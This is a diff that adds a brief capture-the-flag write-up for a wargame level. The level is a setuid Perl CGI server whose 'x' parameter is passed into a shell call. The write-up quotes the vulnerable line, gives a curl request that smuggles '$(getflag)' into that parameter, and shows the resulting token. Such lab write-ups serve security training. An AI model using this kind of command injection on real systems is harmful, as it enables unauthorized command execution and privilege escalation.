@@ -1,0 +1,12 @@
+for this level we have a suid perl script own by the user flag04
+that serve a local server on port 4747
+
+the server is a http server that use GCI
+
+the script eval the shell command with the `x` parameter and echo back the result
+	print `echo $y 2>&1`;
+
+$> curl "localhost:4747?x=\$(getflag)"
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+this token is the level04's password
